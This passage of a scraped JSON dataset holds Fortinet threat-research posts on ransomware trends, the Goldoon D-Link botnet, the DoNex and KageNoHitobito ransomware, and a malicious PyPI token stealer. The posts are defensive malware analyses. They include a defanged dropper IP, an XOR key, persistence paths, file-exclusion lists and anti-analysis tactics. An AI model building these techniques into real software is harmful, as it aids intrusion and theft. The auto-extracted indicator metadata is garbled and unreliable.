searching for and disclosing vulnerabilities. It’s no surprise that the threat of ransomware continues to keep security teams up at night. Across our sensors, ransomware detections surged 13 times higher over the first half of 2023. That was followed by a 70% drop during the latter half of the year, during which we also saw fewer organizations detecting ransomware variants. However, this shift isn’t a cause for celebration. In our2024 threat predictions report, we forecasted that adversaries looking for bigger payouts would turn their attention to critical sectors. This prediction came to fruition in 2H 2023: We witnessed a shift away from the traditional “spray and pray” ransomware strategy, with cybercriminals taking a more targeted approach and asking for higher ransom demands. Industrial organizations—including energy, healthcare, manufacturing, transportation, and automotive—experienced almost half (44%) of all ransomware and wiper detections in the second half of the year. Our FortiGuard Labs team monitors an array of globally deployed sensors that collect trillions of threat events worldwide each day. This unique vantage point gives us a detailed view of the threat landscape, including how exploit, malware, and botnet trends change. Exploitation activity captured by the FortiGuard Intrusion Prevention System (IPS) sensors running on our FortiGate Next-Generation Firewalls offers us visibility into how threat actors find vulnerabilities, exploit their targets, and build malicious infrastructure. Not surprisingly, IoT devices were popular targets, with attackers exploiting everything fromfirewallstoroutersduring the year’s second half. After threat actors find an exploitable vulnerability, their next step is often to deploy malware. Samples picked up by our various anti-malware solutions give us a better understanding of popular adversary tools, like JS/ScrInject and JS/Cryxos. Outside of these two consistently prevalent strains, four other malware families caught our attention in 2H 2023:AndroxGh0st,Apache ActiveMQransomware,Lazarus RATs, andAgent Tesla. Once infected with malware, systems often attempt to communicate with remote hosts to download additional payloads, establish command and control channels, and open backdoors into the environment. Botnet insights are vital to understanding the full scope of an attack. While we consistently see activity among Gh0st, Mirai, and ZeroAccess, we identified several new botnets to watch, including Prometei and DarkGate. In each threat landscape report, we aim to determine how long it takes for a vulnerability to move from initial release to exploitation and whether vulnerabilities with a highExploit Prediction Scoring System(EPSS) score are exploited faster. For the new exploits identified, attacks occurred an average of 4.76 days after discovery, which is 43% faster than the time-to-exploitation observed in 1H 2023. This underscores the need to use EPSS as an early warning system, as well as the importance of prioritizing patching efforts to mitigate the vulnerabilities most likely to be exploited. In 2022, we introduced the concept ofthe “red zone,”which helps security practitioners better understand how likely (or unlikely) it is that threat actors will exploit a specific vulnerability. We aim to help security teams prioritize their remediation efforts, focusing on the vulnerabilities that present the most significant risk. The good news is that only a fraction (<1%) of all published vulnerabilities were exploited in 2H 2023. However, when it comes to vulnerabilities, remember that what’s “old” is still new in the eyes of many attackers. We continue to see threat actors exploiting vulnerabilities over 15 years old, and nearly all organizations (98%) have detected exploits in their environments that have been in attackers’ toolboxes for at least five years. APT groups continue to be highly adaptable to changes in the digital landscape and are increasingly stealthy, carefully planning and executing their attacks. Based on intelligence from FortiRecon, we observed 38 of the 143 APT groups (27%) identified by MITRE as being active during the second half of the year. Of those, Lazarus Group, Kimusky, APT28, APT29, Andariel, and OilRig were the most active. While much of our telemetry shows us what actions attackers have taken previously, darknet intelligence helps us anticipate what adversaries may do next. In the last six months of 2023, threat actors discussed targeting organizations within the financial services industry most often, followed by the business services and education sectors. More than 20 significant zero days were shared on the dark web, and over 850,000 payment cards were advertised for sale. The most publicly active threat actors across the dark web were Valerka, Punktir, CoreLab, XXXX, and qwer. Disrupting cybercrime requires a culture of collaboration, transparency, and accountability on a larger scale than possible with each entity working independently. Cybersecurity vendors have a crucial role to play in this endeavor. Join us atRSA Conference 2024to learn more about the importance of driving responsible transparency across the industry during the session, “No More Secrets in Cybersecurity: Implementing Radical Transparency.” This discussion will feature renowned experts from organizations such as the Cyber Threat Alliance, the Cybersecurity and Infrastructure Security Agency (CISA), Fortinet, and the Former Undersecretary of the Department of Homeland Security. The latest Global Threat Landscape Report represents the collective intelligence of FortiGuard Labs, drawn from Fortinet’s vast array of sensors collecting billions of threat events observed worldwide during the second half of 2023. The FortiGuard Labs Global Threat Landscape Report uses the MITRE ATT&CK framework to describe how threat actors find vulnerabilities, build malicious infrastructure, and exploit their targets. The report covers global and regional perspectives. Download your copy of the2H 2023 FortiGuard Labs Threat Landscape Reportnow. Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/key-findings-2h-2023-fortiguard-labs-threat-report",
      "scraped_at": "2025-07-20T13:48:11.599920",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.5944986690328306
    }
  },
  {
    "id": "Fortinet_34019",
    "source": "Fortinet",
    "title": "New “Goldoon” Botnet Targeting D-Link Devices",
    "text": "FortiGuard Labs Threat Research Affected Platforms:D-Link DIR-645 Wired/Wireless Router Rev. Ax with firmware 1.04b12 and earlierImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High In April, FortiGuard Labs observed a new botnet targeting a D-Link vulnerability from nearly a decade ago, CVE-2015-2051. This vulnerability allows remote attackers to execute arbitrary commands via a GetDeviceSettings action on the HNAP interface. As a result, an attacker can create a crafted HTTP request with a malicious command embedded in the header. Our IPS signature captured attempts to exploit the CVE-2015-2051 vulnerability to propagate a new botnet that we have named “Goldoon.” Figure 1 shows the attack packet. If a targeted device is compromised, attackers can gain complete control, enabling them to extract system information, establish communication with a C2 server, and then use these devices to launch further attacks, such as distributed denial-of-service (DDoS). Our telemetry data also indicates that this botnet activity spiked in April, almost doubling the usual frequency. In this article, we will provide detailed insights into the propagation and actions of the Goldoon botnet. The attackers initially exploit CVE-2015-2051 to download a file “dropper” from “hxxp://94[.]228[.]168[.]60:8080.” The script is programmed to automatically download, execute, and clean up potentially malicious files across various Linux system architectures, including aarch64, arm, i686, m68k, mips64, mipsel, powerpc, s390x, sparc64, x86-64, sh4, riscv64, DEC Alpha, and PA-RISC. Each downloaded file, named “goldoon,” is executed immediately after its download and permission adjustment. After execution, the script removes the executed file and then deletes itself to erase any trace of its activity, thereby enhancing its stealth. The primary role of the “i686-linux-gnu” downloaded from the dropper is to get the botnet file. It first employs the XOR key, “YesItsAnAntiHoneypotBaby,” to decrypt the specific strings “linux” and “i686-linux-gnu.” After decoding, it attaches them to “/bins” to construct the full Uniform Resource Identifier (URI). It uses a fixed header, “User-Agent: FBI-Agent (Checking You),” to get the ultimate payload. Any attempt to open the targeted URI using a web browser will lead to the error message shown in Figure 7. Finally, it iterates through a set of paths, modifying each file it can write to and then deleting those files after modification. This is another cleanup mechanism to cover its tracks in a compromised system. Through analyzing the malware, we found that it has the following behaviors: Goldoon first initializes some required arguments for establishing a connection. For example, it uses “WolfSSL” for traffic encryption and sets the Google DNS server (i.e., “8.8.8.8”, “8.8.4.4”) as a DNS resolver. This allows the malware to carry through its attack. There are ten different autorun methods, each aiming to execute malware while the victim’s computer is starting up. We can classify them into the following types: Boot Execution, Daemon, and Logon Execution. The malware can execute itself through Linux booting initialize files or applications, such as “/etc/rc.local,” “crontab,” etc. Otherwise, it can be created as a daemon named “goldoon.server” and later enable itself to persist in the victim’s computer. In addition, the malware can also execute automatically as soon as the victim logs on to the compromised device. Autorun Type Autorun Method Boot Execution /etc/rc.local /etc/init.d/startup_script /etc/init.d/S99startup /etc/profile /etc/systemd/system/goldoon.service /etc/inittab Logon Execution ~/.config/autostart/goldoon.desktop /etc/xdg/autostart/goldoon.desktop The Goldoon malware continuously tries to connect to its C2 server until a connection is established. It also records information about the targeted system, such as user name, etc. Once completed, the Goldoon malware receives packets from the C2 server. These contain commands for follow-up actions. The packet has seven cases that are set off by the C2 server. Two of them have obviously malicious purposes. One executes commands through “/bin/bash -c” on the victim host, and the other triggers different DoS attacks. According to our analysis, this malware contains an astounding 27 different methods related to various attacks. Attack Method ICMP Flooding TCP Flooding, XMAS Attack, etc. UDP Flooding DNS Flooding HTTP Bypass, HTTP Flooding, etc. Minecraft DDoS Attack Table 2: Attack Methods Take a TCP SYN flooding attack as an example. The malware first gathers information about the target, such as its IP and port, and even checks whether the target IP is IPv6. Goldoon can launch DoS attacks through common protocols, including the game Minecraft. The malware uses various packets to launch a DoS attack, especially for attacks through TCP, which includes more than ten types of packets. Because some of these methods are empty, such as “http_exploit,” “http_xflow,” “http_pps,” and “http_cps,” we deduce that the attacker may have an ongoing development of the malware. While CVE-2015-2051 is not a new vulnerability and presents a low attack complexity, it has a critical security impact that can lead to remote code execution. Once attackers successfully exploit this vulnerability, they can incorporate compromised devices into their botnet to launch further attacks. FortiGuard Labs has identified one such new botnet, “Goldoon,” that is exploiting this vulnerability, reminding us that botnets continue to evolve and exploit as many devices as possible. We strongly recommend applying patches and updates whenever possible because of the ongoing development and introduction of new botnets. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BAT/Agent. G!tr.dldrELF/Agent. JL!tr.dldrELF/Agent. GLN!trPOWERSHELL/Agent. G!tr.dldrW64/Agent. GLN!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. FortiGuard Labs provides IPS signatures against attacks exploiting the following vulnerability: CVE-2015-2051: D-Link. Devices. HNAP. SOAPAction-Header. Command. Execution We also suggest that organizations go through Fortinet’sfree cybersecurity trainingmodule:Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. 94[.]228[.]168[.]60 66f21251d7f8c58316f149fec104723beb979a1215ad4e788d83f0ee6fd34696712d9abe8fbdff71642a4d377ef920d66338d73388bfee542f657f2e916e219cd7367d41d19baa4f1022f8eb47f7ff1e13f583265c7c26ab96d5f716fa0d61eefdf6dae772f7003d0b7cdc55e047434dbd089e0dc7664a3fae8ccfd9d10ece8caa9e6006bce7d0b4554165dba76e67c4a44d98090c9e6ac9f3dca726f6e9adbffc44018b7432d9e6a1e98f723b0402101fa6e7483d098b10133aac142c0a4a0be7b78f16d0dfc91b4c7e8fd50fc31eba1eb22ec7030af9bf7c551b6019c793330e6eb17664943756cab434af5d94fcd341f154cb36fc6f1ef5eb5cfdce68975f9af8720766c5f3978718c026c2263801b08634443c93bd67022c56c6ef531ef3df71219ba6f5835309479b6e3eaca73b187f509b915420656bfe9a9cc32596c248130a7c09a5c92e15b3fc0d2e1eb655e0bd8f759e01ba849f7734e32dbc26528eb9c1eaecd0dcdd242e1bc8c62a1052915b627abe2de8ce147635fb7da3bfccb050a1ff0d205f392195179233493ff5b6f44adc93fe0dba1f78c4fe90ebcc46ffd2d3888b6b1289e380fa040247db6a4fbd2555db3e01fadd2fe41a0fa2debc88cea61218bdeea94537b74c67873e75b8ada6d050a30d311569c3118d161c46115e15fbee077a9e126cc0eb349445df34cc9404245520c702fadc5f75b6f859b10e47db989e29ace6c23ed15e29f313993f95e5e615711060881dfa84618071037331ab84a841b9d3cfb6f8797c1695e2dc0a2cdcc3f8f3c794dfaa50bcf0df5631980fab33525f4de1b47be606cd518403f54fa71b81186f02dbf7e9ed0004246142a5e3f3d3f84d8b38f98ff6897b03628e06e31016b8fafc9eb8c2b6201d3123a458a6346fd14c5bd7d41cda6c9c9bdabc786366a9ab3d5e7c00132ff83545bf2c9c6628d87a3cb85ee78ae3e92a09949185e6da11c41e2df04a53bb1274c81cfe4d3b98d0b28d3c3e7812beda005279bc6c67821b27571240eba440fa49 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/new-goldoon-botnet-targeting-d-link-devices",
      "scraped_at": "2025-07-20T13:48:19.356696",
      "indicators": {
        "ip_address": [
          "8.8.4.4",
          "8.8.8.8"
        ],
        "domain": [
          "oldoon",
          "r",
          "c"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2015-2051"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.7253384912959382
    }
  },
  {
    "id": "Fortinet_38027",
    "source": "Fortinet",
    "title": "Ransomware Roundup - KageNoHitobito and DoNex",
    "text": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the KageNoHitobito and DoNex ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft Windows UsersImpact:Steals and encrypts victims' files and demands ransom for file decryption and not releasing the stolen data. Severity level:High KageNoHitobito ransomware samples became available in late March 2024. As with most ransomware, this ransomware encrypts files on victims' machines and demands a ransom to decrypt them through dropped ransom notes. Although the group uses TOR to communicate with its victims, a data leak site is unavailable as it does not claim to have stolen any victims' information. Information on the infection vector used by the KageNoHitobito ransomware threat actor is unavailable. The KageNoHitobito ransomware samples were submitted to a publicly available file scanning service from several countries: Chile, China, Cuba, Germany, Iran, Lithuania, Peru, Romania, Sweden, Taiwan, the United Kingdom, and the United States. This suggests that the KageNoHitobito ransomware threat actor may have made the malware available on file-sharing services as fake software or game cheats and lured victims to these locations. The KageNoHitobito ransomware is designed to encrypt files only on the local drive, not on networked drives. The files encrypted by the ransomware have a “.hitobito” extension. It avoids encrypting files with the following file extensions: The ransomware is designed not to continue if the current date of the compromised machine is 14 days after March 21, 2024. The ransomware displays a ransom note on the victim’s desktop and drops a text-based ransom note called \"KageNoHitobito_ReadMe.txt.\" KageNoHitobito is Japanese and can be translated as \"shadow people.\" We could not associate the term \"shadow people\" with any popular culture, including Japanese anime, to which some threat actors are fixated. The ransom note instructs victims to visit a TOR site that uses the AbleOnion chat platform and join a chat room. This site does not appear to be specific to the KageNoHitobito ransomware, as the ongoing group chat in both the designated chat room and the group chat at the time of our investigation is unrelated to ransom negotiations. DoNex is a relatively new, financially motivated ransomware group first reported in early March 2024. The file creation time of the samples is mid-February, so the ransomware may have been distributed prior to the date of the first report. All victims of the DoNex ransomware on the data leak site were added in February. Information about the infection vector used by the DoNex ransomware threat actor is unavailable. However, it is not likely to be significantly different from other ransomware groups. The DoNex ransomware’s data leak site on TOR listed five victims during our investigation. The organizations that were claimed to have been affected by the ransomware are located in Belgium, the Czech Republic, Italy, the Netherlands, and the United States. The actions of DoNex ransomware are dictated by a configuration file set by the threat actor. The DoNex ransomware encrypts files on both local drives and network shares, as <local_disks> and <network_shares> are set to true. The ransomware adds a victim ID as a file extension to the affected files and changes their file icons. According to the <while_extens> section in the configuration file, DoNex ransomware avoids encrypting files with the following extensions: deskthemepack It also avoids encrypting the following files listed in <white_files>: autorun.inf bootfont.bin bootsect.bak desktop.ini iconcache.db ntuser.dat.log GDIPFONTCACHEV1. DAT d3d9caps.dat The DoNex ransomware does not encrypt files in the following folders listed in <white_folders>: $recycle.bin $windows.~bt ;$windows.~ws program files program files (x86) programdata system volume information tor browser windows.old It terminates the following processes listed in <kill_keep>: It terminates the following services listed in <services>: The ransomware is configured to delete shadow copies, making file recovery difficult. It then drops a ransom note labeled “Readme.[victim ID].txt} that demands contact via a TOR site, TOX chat, or email. Another ransomware, DarkRace, which appeared in mid-2023, uses a very similar ransom note and has the same configuration file, indicating that DoNex is possibly based on DarkRace and that the threat actor behind DoNex may be the same as DarkRace. During our research, the DoNex ransomware was operating a data leak site on TOR, which listed five victims in Europe and North America. Since no new victims have been added since February 27th, the threat actor has likely already ceased operations and moved on. The KageNoHitobito and DoNex/DarkRace ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. KageNoHitobito and DoNex/DarkRace Ransomware File IOCs 8939bfe20bc6476806d22c8edfcaba5c36f936b893b3de1c847558502654c82f Hitobito ransomware 1940fcdb2561c2f7b82f6c44d22a9906e5ffec2438d5dadfe88d1608f5f03c33 506e8753dd5ca1c8387be32f26367e26f242b7c65e61203f7f926506c04163aa 8a10e0dc4994268ea33baecd5e89d1e2ddabef30afa09961257a4329669e857a bec9d2dcd9565bb245f5c8beca4db627390bcb4699dd5da192cc8aba895e0e6a 0adde4246aaa9fb3964d1d6cf3c29b1b13074015b250eb8e5591339f92e1e3ca DoNex ransomware 6d6134adfdf16c8ed9513aba40845b15bd314e085ef1d6bd20040afd42e36e40 b32ae94b32bcc5724d706421f915b7f7730c4fb20b04f5ab0ca830dc88dcce4e 74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3 DarkRace ransomware(predecessor of DoNex) 0e60d49a967599fab179f8c885d91db25016be996d66a4e00cbb197e5085efa4 Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-keganohitobito-and-donex",
      "scraped_at": "2025-07-20T13:48:27.565097",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ootsect",
          "ecycle",
          "utorun",
          "ootfont",
          "esktop",
          "tuser",
          "indows",
          "3d9caps",
          "concache"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "506e8753dd5ca1c8387be32f26367e26f242b7c65e61203f7f926506c04163aa",
          "0e60d49a967599fab179f8c885d91db25016be996d66a4e00cbb197e5085efa4",
          "74b5e2d90daaf96657e4d3d800bb20bf189bb2cf487479ea0facaf6182e0d1d3",
          "b32ae94b32bcc5724d706421f915b7f7730c4fb20b04f5ab0ca830dc88dcce4e",
          "8939bfe20bc6476806d22c8edfcaba5c36f936b893b3de1c847558502654c82f",
          "6d6134adfdf16c8ed9513aba40845b15bd314e085ef1d6bd20040afd42e36e40",
          "8a10e0dc4994268ea33baecd5e89d1e2ddabef30afa09961257a4329669e857a",
          "bec9d2dcd9565bb245f5c8beca4db627390bcb4699dd5da192cc8aba895e0e6a",
          "1940fcdb2561c2f7b82f6c44d22a9906e5ffec2438d5dadfe88d1608f5f03c33",
          "0adde4246aaa9fb3964d1d6cf3c29b1b13074015b250eb8e5591339f92e1e3ca"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.7636363636363638
    }
  },
  {
    "id": "Fortinet_65115",
    "source": "Fortinet",
    "title": "Unraveling Cyber Threats: Insights from Code Analysis",
    "text": "FortiGuard Labs Threat Research Affected platforms:All platforms where PyPI packages can be installedImpacted parties:Any individuals or institutions that have these malicious packages installedImpact:Leak of credentials, sensitive information, etc. Severity level:High Vigilance is paramount in cybersecurity, especially when it comes to understanding and dissecting potentially malicious code. In this blog post, we'll delve into a piece of code designed (discordpy_bypass-1.7 ) to extract sensitive data from user systems. We'll analyze its components, functions, and methodologies to understand its purpose and approach. FortiGuard Labs uses a proprietary, AI-driven OSS malware detection system to hunt for and monitor threats. Using this approach on the Python Package Index (PyPI) supply chain platform, we unearthed a malicious PyPI package named discordpy_bypass-1.7, published on March 10, 2024, and detected on March 12, 2024. This code aims to covertly extract sensitive information from unsuspecting victims using a blend of persistence techniques, browser data extraction, and token harvesting. Understanding the origins and propagation methods of malicious code is paramount in its analysis. Authored by theaos, the author produced seven versions of the package, including versions 1.1, 1.2, 1.3, 1.4, 1.5, 1.6, and 1.7. The upgrade-colored_0.0.1 also exhibits similar malicious content as discordpy_bypass, indicating a consistent behavior pattern across versions. \"discordpy_bypass-1.7\" highlights the sort of ongoing threats seen across the cybersecurity landscape. This PyPI package version exhibits similar malicious behavior to previous malicious packages, focusing on extracting sensitive data from user systems through obfuscated code and evasion techniques targeting analysis environments. The code employs various checks to detect debugging or analysis environments and terminates itself if detected, showcasing the author's effort to evade scrutiny. The code has three layers. The original Python code is encoded using base64 (the innermost layer). The encoded strings are then broken into separate pieces and encoded once again with some obfuscation techniques (intermediate layer). The obfuscated file is then compiled using pyinstaller into an exe (the last layer) put on a remote URL. The code in discordpy_bypass/discordpy_bypass.py fetches the code from the URL and runs it on the user's device. This underscores the critical need for vigilance and proactive measures to effectively detect and mitigate cybersecurity threats. One of the first lines of defense code developers use against reverse engineering is detecting debugging or analysis environments. The code segment employs multiple techniques, listed below, to identify such environments and terminate the program’s “self-destruct” if detected. Block listed Processes: These iterate over the running processes and terminates them if their names match those in the blocked process list (“blacklistedProcesses”). These processes include debugging tools like Wireshark, OllyDbg, and IDA64 Network-related Checks: Compares system IP and MAC addresses against block lists (“blackListedIPS”, “blackListedMacs”). If the IP or MAC address is found in a block list, it returns “True,” indicating a debugging environment. System-related Checks: Compares system username, hostname, and hardware ID against block lists. (“blackListedUsers,” “blackListedPCNames,” and “blackListedHWIDS”) The code initializes a number of variables and sets up Socket. IO events to handle connections, disconnections, frame adjustments, and more. It enables remote control and monitoring of a system, facilitating actions such as directory navigation, file operations, and command execution. Several functions handle commands received over Socket. IO, executing various actions based on the command received. These actions include listing directory contents, sending files to the server, displaying alerts, listing processes, terminating processes, gathering system information, and more. Browser Data Extraction and Token Harvesting: The code's core functionality revolves around extracting sensitive information from browsers and harvesting authentication tokens, particularly from Discord. Browser Data Extraction: It utilizes techniques to extract data such as login credentials, cookies, web history, and more from various browsers. Token Harvesting: This process also decrypts and validates authentication tokens extracted from files, particularly Discord tokens, before uploading them to a remote server. Our investigation into the \"discordpy_bypass-1.7\" code has uncovered a clever and sneaky cyber threat to secretly steal important information from people's computers. What makes this code especially dangerous is how it tries to trick computer systems and experts who attempt to analyze it. It's like a master of disguise that can escape from being caught. This discovery reminds us that the internet isn't always a safe place. We need to stay alert to protect ourselves from such threats. Understanding them helps us build stronger defenses and stay safe in our digital world. By working together and staying cautious, we can keep our personal information and digital lives secure. FortiGuard AntiVirusdetects the malicious files identified in this report as upgrade-colored-0.0.1/colored/call.py:Python/Agent. COL!trupgrade-colored-0.0.1/colored_payload:Python/Agent.0337!trdiscordpy_bypass-1.0/discordpy_bypass/discordpy_bypass.py:Python/Disco. BYP!tr.dldrdiscordpy_bypass-1.1/discordpy_bypass/discordpy_bypass.py:Python/Disco. BYP!tr.dldrdiscordpy_bypass-1.2/discordpy_bypass/discordpy_bypass.py:Python/Disco. BYP!tr.dldrdiscordpy_bypass-1.3/discordpy_bypass/discordpy_bypass.py:Python/Disco. BYP!tr.dldrdiscordpy_bypass-1.4/discordpy_bypass/discordpy_bypass.py:Python/Disco. BYP!tr.dldrdiscordpy_bypass-1.5/discordpy_bypass/discordpy_bypass.py:Python/Disco. BYP!tr.dldrdiscordpy_bypass-1.6/discordpy_bypass/discordpy_bypass.py:Python/Disco. BYP!tr.dldrdiscordpy_bypass-1.7/discordpy_bypass/discordpy_bypass.py:Python/Disco. BYP!tr.dldrdiscordpy_bypass-1.7/discordpy_bypass/discordpy_bypass_payload.exe:Python/Agent.514A!trdiscordpy_bypass-1.7/discordpy_bypass/discordpy_bypass_python.py:Python/Agent. C77E!trdiscordpy_bypass-1.6/discordpy_bypass/discordpy_bypass_payload.py:Python/Agent.7684!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. TheFortiGuard Web FilteringService detects and blocks the download URLs cited in this report as Malicious. TheFortiDevSecSCA scanner detects malicious packages, including those cited in this report that may operate as dependencies in users' projects in test phases, and prevents those dependencies from being introduced into users' products. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. Hash (sha256) upgrade-colored-0.0.1/colored/call.py ba2ceb9b1c6942617e4aaf76f12674acec0f072fde85249ebb7f0255b0681d8a Python/Agent. COL!tr upgrade-colored-0.0.1/colored_payload 21ce98a759d413a94487d76b4a37574787bba4695bde5444909f85c40b6a96dd Python/Agent.0337!tr discordpy_bypass-1.0/discordpy_bypass/discordpy_bypass.py 3428cfe2de2d415fbdb74b6d099af2061b8af2b21c432ed28b95f360090c80a2 Python/Disco. BYP!tr.dldr discordpy_bypass-1.1/discordpy_bypass/discordpy_bypass.py 3818b238229a40c64dd1cf07d064d5f6580d1887113691cdae23b55364ce572e Python/Disco. BYP!tr.dldr discordpy_bypass-1.2/discordpy_bypass/discordpy_bypass.py 49e74d6ee9ff330db385ac50c398b31ff96bdc88631a3ba4231c9cb11b91f91b Python/Disco. BYP!tr.dldr discordpy_bypass-1.3/discordpy_bypass/discordpy_bypass.py 6259496c7bf20f7b1cca959cd2807538f7e1f735a5bdef487de31c6f7c535645 Python/Disco. BYP!tr.dldr discordpy_bypass-1.4/discordpy_bypass/discordpy_bypass.py 66776b62992ab3a9801293852113e882822bb12cba4d8e89104aa60fbf83ee6d Python/Disco. BYP!tr.dldr discordpy_bypass-1.5/discordpy_bypass/discordpy_bypass.py 164f75859cbfe3d1dd78304de69d6d969df7f681a93b95162c98644425a9c4d2 Python/Disco. BYP!tr.dldr discordpy_bypass-1.6/discordpy_bypass/discordpy_bypass.py 1ebdd85a61edb7dde0e2ab59eb58325afd271cff3d364be95c142ed6fa312fae Python/Disco. BYP!tr.dldr discordpy_bypass-1.7/discordpy_bypass/discordpy_bypass.py 31c1c3530655fb6da70368fd6c462893ff1b85feda7e5ecbdd9c5ec600e4edb1 Python/Disco. BYP!tr.dldr discordpy_bypass-1.7/discordpy_bypass/discordpy_bypass_payload.exe 8fd185a5499d728eef4cd181477b0720a60c8be143ff2628941bb2a5985b1f73 Python/Agent.514A!tr discordpy_bypass-1.7/discordpy_bypass/discordpy_bypass_python.py d937aaf9f8a35687a5397aa9a657094c53553afba15953bc8c75fc9955a82b4c Python/Agent. C77E!tr discordpy_bypass-1.6/discordpy_bypass/discordpy_bypass_payload.py e6ccaa47337109d0bec65c573c9d6956e30c893e6bee5fc3bd6ab19f26ba558d Python/Agent.7684!tr FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/unraveling-cyber-threats-insights-from-code-analysis",
      "scraped_at": "2025-07-20T13:48:35.946818",
      "indicators": {
        "ip_address": [],
        "domain": [
          "r",
          "all"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "1ebdd85a61edb7dde0e2ab59eb58325afd271cff3d364be95c142ed6fa312fae",
          "31c1c3530655fb6da70368fd6c462893ff1b85feda7e5ecbdd9c5ec600e4edb1",
          "3818b238229a40c64dd1cf07d064d5f6580d1887113691cdae23b55364ce572e",
          "66776b62992ab3a9801293852113e882822bb12cba4d8e89104aa60fbf83ee6d",
          "3428cfe2de2d415fbdb74b6d099af2061b8af2b21c432ed28b95f360090c80a2",
          "21ce98a759d413a94487d76b4a37574787bba4695bde5444909f85c40b6a96dd",
          "49e74d6ee9ff330db385ac50c398b31ff96bdc88631a3ba4231c9cb11b91f91b",
          "d937aaf9f8a35687a5397aa9a657094c53553afba15953bc8c75fc9955a82b4c",
          "e6ccaa47337109d0bec65c573c9d6956e30c893e6bee5fc3bd6ab19f26ba558d",
          "164f75859cbfe3d1dd78304de69d6d969df7f681a93b95162c98644425a9c4d2",
          "8fd185a5499d728eef4cd181477b0720a60c8be143ff2628941bb2a5985b1f73",
